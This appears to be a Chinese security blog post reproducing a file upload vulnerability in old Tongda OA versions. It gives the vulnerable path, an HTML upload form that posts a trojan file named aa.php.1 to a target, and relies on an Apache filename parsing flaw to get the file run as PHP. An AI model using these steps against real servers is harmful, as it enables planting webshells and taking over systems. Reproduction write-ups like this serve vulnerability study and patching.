**目录**

[漏洞文件](#t0 "漏洞文件")

[漏洞利用条件](#t1 "漏洞利用条件")

[漏洞复现](#t2 "漏洞复现")

* * *

### 漏洞文件

    /general/vmeet/privateUpload.php

### 漏洞利用条件

*   通达OA低版本
*   apache存在解析漏洞

### 漏洞复现

测试环境：通达OA 2008，[apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020)存在解析漏洞

![](https://img-blog.csdnimg.cn/20200512200913686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

首先访问是否存在该文件

![](https://img-blog.csdnimg.cn/20200512201043851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

存在的话，将下面代码保存后缀为1.html文件，然后将[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)命名为 aa.php.1，与1.html在同一个目录下

```
<form id="frmUpload" enctype="multipart/form-data"      
action="http://xx.xx.xx.xx/general/vmeet/privateUpload.php?fileName=aa.php.1" method="post">Upload a new file:<br>      
<input type="file" name="Filedata" size="50"><br>      
<input type="submit" value="Upload">      
</form>
```


![](https://img-blog.csdnimg.cn/20200512201321826.png)

双击1.html用浏览器打开，然后选择 aa.php.1 文件，点击Upload，文件上传成功。

![](https://img-blog.csdnimg.cn/2020051220142376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200512201453722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

此时木马文件路径为： http://xx.xx.xx.xx/general/vmeet/upload/temp/aa.php.1

由于apache存在解析漏洞，aa.php.1 文件会被apache当做php文件解析，所以可以执行成功。传送门：[Apache解析漏洞](https://xie1997.blog.csdn.net/article/details/82834063#%E4%B8%80%EF%BC%9A%E6%96%87%E4%BB%B6%E5%90%8D%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E "Apache解析漏洞")

![](https://img-blog.csdnimg.cn/20200512201537516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)